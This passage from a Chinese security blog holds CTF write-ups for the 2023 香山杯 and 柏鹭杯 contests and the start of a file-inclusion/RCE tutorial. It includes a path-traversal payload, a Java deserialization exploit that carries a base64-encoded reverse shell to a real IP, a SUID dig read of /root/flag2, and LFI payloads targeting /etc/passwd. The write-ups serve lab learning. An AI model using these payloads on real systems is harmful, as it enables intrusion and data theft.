alt="img"></p><p>比赛的时候，&#x2F;flag提示我们要RCE，但是这题可以通过非预期读取&#x2F;proc&#x2F;29&#x2F;fd&#x2F;6获取到flag</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493422.png" alt="img"></p><p>预期应该是读&#x2F;root&#x2F;flag.java文件，然后再往下走……，这里因为赛后靶机关了，也就没机会尝试了，具体的flag.java代码如下，感兴趣的师傅可以自行尝试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.DriverManager;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">flag</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            input = Files.newInputStream(Paths.get(<span class="hljs-string">&quot;/tmp/config.properties&quot;</span>));<br>            <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>                <span class="hljs-comment">// 连接到SQLite数据库</span><br>                <span class="hljs-comment">// 创建一个属性对象</span><br>                prop.load(input);<br><br>                <span class="hljs-comment">// 创建一个Connection对象，并传入属性对象</span><br>                conn = DriverManager.getConnection(<span class="hljs-string">&quot;jdbc:sqlite:/tmp/mydatabase.db&quot;</span>, prop);<br>                <span class="hljs-comment">// 设置密码</span><br>                <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement();<br>                stmt.close();<br>                Thread.sleep(<span class="hljs-number">5000</span>);<br>            &#125;<br>            <span class="hljs-comment">// 接下来，你可以在此处执行其他操作</span><br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            System.out.println(e.getMessage());<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException | IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (conn != <span class="hljs-literal">null</span>) &#123;<br>                    conn.close();<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (SQLException ex) &#123;<br>                System.out.println(ex.getMessage());<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动文件（&#x2F;root&#x2F;start.sh）如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>FLAG_PATH=/tmp/config.properties<br>FLAG_MODE=M_SED<br>if [ $&#123;ICQ_FLAG&#125; ];then<br>    case $FLAG_MODE in<br>        &quot;M_ECHO&quot;)<br>            echo -n $&#123;ICQ_FLAG&#125; &gt; $&#123;FLAG_PATH&#125;<br>            FILE_MODE=755 <br>            chmod $&#123;FILE_MODE&#125; $&#123;FLAG_PATH&#125;<br>            ;;<br>        &quot;M_SED&quot;)<br>            #sed -i &quot;s/flag&#123;x*&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;<br>            sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;<br>            ;;<br>        &quot;M_SQL&quot;)<br>            # sed -i -r &quot;s/flag\&#123;.*\&#125;/$&#123;ICQ_FLAG&#125;/&quot; $&#123;FLAG_PATH&#125;<br>            # mysql -uroot -proot &lt; $&#123;FLAG_PATH&#125;<br>            ;;<br>        *)<br>            ;;<br>    esac<br>    echo [+] ICQ_FLAG OK   <br>    unset ICQ_FLAG <br>else<br>    echo [!] no ICQ_FLAG<br>fi<br><br>unset ICQ_FLAG<br>rm -rf /etc/profile.d/pouchenv.sh<br>rm -rf /etc/instanceInfo<br>rm -rf /start.sh<br><br>/usr/sbin/nginx<br><br>/usr/sbin/crond<br><br>/usr/sbin/rsyslogd<br><br>javac /root/flag.java<br>nohup java -classpath /root/sqlite-jdbc-3.41.2.2.jar:/root/ flag &gt;/dev/null &amp;<br><br>nohup java -jar /root/upload.jar &gt;/dev/null &amp;<br>sleep 1;<br><br>rm /tmp/config.properties<br><br>java -Dfile.encoding=UTF-8 -Dsun.java2d.cmm=sun.java2d.cmm.kcms.KcmsServiceProvider -Dspring.config.location=/opt/kkFileView-2.2.1/config/application.properties -jar /opt/kkFileView-2.2.1/bin/kkFileView-2.2.1.jar &amp;<br>exec tail -f /dev/null<br></code></pre></td></tr></table></figure></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.xx5xx.top/Writeup/WEB/2023%E9%A6%99%E5%B1%B1%E6%9D%AF-sharedBox/">https://www.xx5xx.top/Writeup/WEB/2023%E9%A6%99%E5%B1%B1%E6%9D%AF-sharedBox/</a></p><p><a href="https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb">https://www.yuque.com/dat0u/ctf/lbp2gfi6gttxsymb</a></p><p><a href="https://www.cnblogs.com/xbbth/p/17446987.html">https://www.cnblogs.com/xbbth/p/17446987.html</a></p><p><a href="https://github.com/kekingcn/kkFileView/issues/128">https://github.com/kekingcn/kkFileView/issues/128</a></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="PINTU"><a href="#PINTU" class="headerlink" title="PINTU"></a>PINTU</h2><p>图片像素rgb值转2进制再转成字符串发现提示</p><p>然后图片高度隐写，8进制转10进制再转成ascii，发现是每两个字符为一组（因为中间有空格分隔）</p><p>再转一次ascii码，得到一串字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>os.chdir(os.path.dirname(__file__))<br><br><span class="hljs-comment">#img_width = 65 # 所有图片的统一宽度</span><br>img_num = <span class="hljs-number">4703</span> <span class="hljs-comment"># 图片总数</span><br>num = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment">#图片像素转二进制</span><br>heigth_list = [] <span class="hljs-comment">#高度list</span><br>ten_chr = <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">#高度转10进制</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, img_num+<span class="hljs-number">1</span>):<br>    img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;pintu/<span class="hljs-subst">&#123;i&#125;</span>.png&#x27;</span>) <span class="hljs-comment"># 打开图片</span><br>    <span class="hljs-comment">#像素rgb转二进制</span><br>    pixel = img.getpixel((<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment">#print(pixel)</span><br>    <span class="hljs-keyword">if</span> pixel == <span class="hljs-number">0</span>:<br>        num += <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        num += <span class="hljs-string">&#x27;1&#x27;</span><br>    <br>    heigth_list.append(img.height)<br>    <br>num = <span class="hljs-built_in">int</span>(num,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(long_to_bytes(num).decode())<br><span class="hljs-string">&#x27;&#x27;&#x27;flag看到666c是不是特别兴奋，很可惜flag并不在这。（狗头保命），既然走到了这里，那我也给一个通关的关键信息拿去吧，去找到真正的flag吧：sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W                        </span><br><span class="hljs-string">         哎，对了。拿走之前看一看我精心挑选的笑话吧：猎人打猎，朝狐狸开枪，“砰”地一声枪响之后猎人死了。狐狸叉着腰，冷笑一声：</span><br><span class="hljs-string">“没想到吧，我是反射弧。”好不好笑， 有没有感觉一哆嗦，大脑更清晰了。ฅ՞•ﻌ•՞ ต&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> heigth_list:<br>    ten_chr += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(i),<span class="hljs-number">8</span>))  <span class="hljs-comment">#8转10转ascii</span><br><span class="hljs-comment">#print(heigth_list)</span><br><span class="hljs-built_in">print</span>(ten_chr)<br><br>data = ten_chr.split(<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-comment">#print(data)</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    flag += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(data[i]))<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-commentspan><br></code></pre></td></tr></table></figure><p>base32-&gt;base64换表-&gt;base64</p><p><img src="/../img/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/169795243493423.png" alt="img"></p><p>拿到一张rgb很混乱的图片，Piet隐写</p><p>用工具npiet</p><p>下载：<a href="https://www.bertnase.de/npiet/">https://www.bertnase.de/npiet/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">npiet.exe -tpic download.png <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023柏鹭杯</title>
    <link href="/2023/10/18/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/"/>
    <url>/2023/10/18/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="2023柏鹭杯"><a href="#2023柏鹭杯" class="headerlink" title="2023柏鹭杯"></a>2023柏鹭杯</h1><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="express-fs"><a href="#express-fs" class="headerlink" title="express fs"></a>express fs</h2><p>参考：<a href="https://www.cnblogs.com/91ac0m0/p/17557039.html">https://www.cnblogs.com/91ac0m0/p/17557039.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Python">?file[protocol]=file:&amp;file[href]=a&amp;file[pathname]=fl%2561g.txt&amp;file[hostname]=&amp;file[origin]=x<br></code></pre></td></tr></table></figure><h2 id="综合题5"><a href="#综合题5" class="headerlink" title="综合题5"></a>综合题5</h2><p>源码中有<code>/readfile?filename=</code></p><p>目录穿越读文件<code>/../../../../../app/demo.jar</code></p><p>拿到源码</p><p>Upload.class，upload类中有混淆加密的flag1</p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252215.png" alt="img"></p><p>逆向一下得到flag1</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReverseUpload</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">O0O</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;6925cc02789c1d2552b71acc4a2d48fd&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">ReverseUpload</span> <span class="hljs-variable">uploader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReverseUpload</span>();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">originalEncFlag1</span> <span class="hljs-operator">=</span> uploader.decryptEncFlag1();<br>        System.out.println(<span class="hljs-string">&quot;Original enc_flag1: &quot;</span> + originalEncFlag1);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> String <span class="hljs-title function_">decryptEncFlag1</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">base64EncodedFlag1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;UFVTUhgqY3d0FQxRVFcHBlQLVwdSVlZRVlJWBwxeVgAHWgsBWgUAAQEJRA==&quot;</span>;<br>        <span class="hljs-type">byte</span>[] decodedBytes = Base64.getDecoder().decode(base64EncodedFlag1);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">decodedString</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(decodedBytes);<br><br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">decryptedFlag</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; decodedString.length(); i++) &#123;<br>            <span class="hljs-type">char</span> <span class="hljs-variable">originalChar</span> <span class="hljs-operator">=</span> decodedString.charAt(i);<br>            <span class="hljs-type">char</span> <span class="hljs-variable">oOO</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.O0O.charAt(i % <span class="hljs-built_in">this</span>.O0O.length());<br>            <span class="hljs-type">char</span> <span class="hljs-variable">encryptedChar</span> <span class="hljs-operator">=</span> (<span class="hljs-type">char</span>) (originalChar ^ oOO);<br>            decryptedFlag.append(encryptedChar);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> decryptedFlag.toString();<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//Original enc_flag1: flag&#123;ISEC-52e353a950c752b3dc8f0d1c949f0361&#125;</span><br></code></pre></td></tr></table></figure><h2 id="综合题6"><a href="#综合题6" class="headerlink" title="综合题6"></a><strong>综合题</strong>6</h2><p>源码中Ping.class是一个恶意类，readObject反序列化，exec可以命令执行</p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252171.png" alt="img"></p><p>通过Upload类的<code>/internalApi/v3.2/updateConfig</code>此路由可以反序列化加载恶意类Ping进行命令执行</p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252172.png" alt="img"></p><p>Ser.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.example.demo;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Ser</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// Create a Ping object</span><br>        <span class="hljs-type">Ping</span> <span class="hljs-variable">ping</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Ping</span>();<br>        ping.setCommand(<span class="hljs-string">&quot;bash&quot;</span>);<br>        ping.setArg1(<span class="hljs-string">&quot;-c&quot;</span>);<br>        ping.setArg2(<span class="hljs-string">&quot;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xLjEyLjI1MS42Mi80NTY3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;</span>);<br><br>        <span class="hljs-comment">// Serialize the Ping object to a byte array</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(ping);<br><br>        <span class="hljs-comment">// Encode the byte array to Base64</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(Base64.getEncoder().encode(baos.toByteArray()));<br>        System.out.println(<span class="hljs-string">&quot;Payload: &quot;</span> + payload);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Payload: rO0ABXNyABVjb20uZXhhbXBsZS5kZW1vLlBpbmcAAAAAAAAAAQIAA0wABGFyZzF0ABJMamF2YS9sYW5nL1N0cmluZztMAARhcmcycQB+AAFMAAdjb21tYW5kcQB+AAF4cHQAAi1jdABfYmFzaCAtYyAne2VjaG8sWW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eExqRXlMakkxTVM0Mk1pODBOVFkzSURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfSd0AARiYXNo</span><br></code></pre></td></tr></table></figure><p>反弹shell</p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252183.png" alt="img"></p><p>find找suid，dig提权，<code>/usr/bin/dig -f /root/flag2</code></p><p><img src="/../img/2023%E6%9F%8F%E9%B9%AD%E6%9D%AF/16976293252184.png" alt="img"></p><h2 id="综合题7"><a href="#综合题7" class="headerlink" title="综合题7"></a>综合题7</h2><p>这题当时差一点时间没打出来，当时上传了msf马到服务器上搭好了隧道redis写了ssh的公钥</p><p>赛后看了很多师傅的wp，都是用frp代理进去，写公钥后连上去即可</p><p>具体参考</p><p><a href="http://blog.xmcve.com/2023/10/13/%E6%9F%8F%E9%B9%AD%E6%9D%AF2023-Writeup/#title-4">星盟</a><br><a href="https://www.cnblogs.com/V3g3t4ble/p/17757854.html">V3g3t4ble</a><br><a href="https://fushuling.com/index.php/2023/10/12/2023%e7%bd%91%e4%bf%a1%e6%9f%8f%e9%b9%ad%e6%9d%af%e5%a4%a7%e5%ad%a6%e7%94%9f%e7%bd%91%e7%bb%9c%e7%a9%ba%e9%97%b4%e5%ae%89%e5%85%a8%e7%b2%be%e8%8b%b1%e8%b5%9b/">fushulingのblog</a></p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>每一行的空格数量为flag的ascii，转一下得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Python">x = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;qd.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    aa = f.readlines()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> aa:<br>        x += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">len</span>(i)-<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(x)<br><span class="hljs-comment">#flag&#123;ISEC-eF8x2Bv1viw9eFvagivx0Ynv3jlai0vL&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含与RCE</title>
    <link href="/2023/10/17/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8ERCE/"/>
    <url>/2023/10/17/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8ERCE/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含与RCE"><a href="#文件包含与RCE" class="headerlink" title="文件包含与RCE"></a>文件包含与RCE</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="文件包含常见函数"><a href="#文件包含常见函数" class="headerlink" title="文件包含常见函数"></a>文件包含常见函数</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">PHP：<span class="hljs-built_in">include</span>()，<span class="hljs-built_in">include_once</span>()，<span class="hljs-built_in">require</span>()，<span class="hljs-built_in">require_once</span>()，<span class="hljs-built_in">fopen</span>()，<span class="hljs-built_in">readfile</span>() 等<br>JSP Servlet：ava<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.File</span>()，java<span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.FileReader</span>() 等<br>ASP：includefile，includevirtual 等<br></code></pre></td></tr></table></figure><p>当 PHP 包含一个文件时，会将该文件当做 PHP 代码执行，而不会在意文件是什么类型。</p><h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><h4 id="1-00-截断"><a href="#1-00-截断" class="headerlink" title="[1]%00 截断"></a>[1]%00 截断</h4><p>需要 <code>magic_quotes_gpc=off</code>，PHP 小于 5.3.4 有效。 <code>?file=../../../../../../../../../etc/passwd%00</code></p><h4 id="2-路径长度截断"><a href="#2-路径长度截断" class="headerlink" title="[2]路径长度截断"></a>[2]路径长度截断</h4><p>Linux 需要文件名长于 4096，Windows 需要长于 256。 <code>?file=../../../../../../../../../etc/passwd/././././././.[…]/./././././.</code></p><h4 id="3-点号截断"><a href="#3-点号截断" class="headerlink" title="[3]点号截断"></a>[3]点号截断</h4><p>只适用 Windows，点号需要长于 256。 <code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p><h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><p>条件<br><code>allow_url_include = on</code></p><p>实质上和LFI一样，只是能够包含远程的文件</p><p>用得比较多的协议有<code>php://input</code></p><h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><h4 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h4><p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code></p><p>php:&#x2F;&#x2F;input是个可以访问请求的原始数据的只读流，可以接收post请求作为输入流的输入，将请求作为PHP代码输入，以达到以post的形式进行输入的目的就可以执行命令命令 </p><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file1</span>);        <span class="hljs-comment">#文件读取</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$file2</span>,<span class="hljs-variable">$txt</span>);   <span class="hljs-comment">#文件写入</span><br><span class="hljs-meta">?&gt;</span><br><br>payload:<br><br>?file1=php:<span class="hljs-comment">//filter/resource=flag.php                             #明文读取</span><br>?file1=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php  #编码读取</span><br> <br>?file2=php:<span class="hljs-comment">//filter/resource=test.txt&amp;txt=test                             #明文写入</span><br>?file2=php:<span class="hljs-comment">//filter/write=convert.base64-encode/resource=test.txt&amp;txt=test #编码写入</span><br></code></pre></td></tr></table></figure><p>利用条件：<br><code>allow_url_include=On</code><br><code>allow_url_fopen=Off/On</code> </p><p>常见编码有两种方式：<code>base64</code>&#x2F;rot-13编码，两种过滤器分别为： 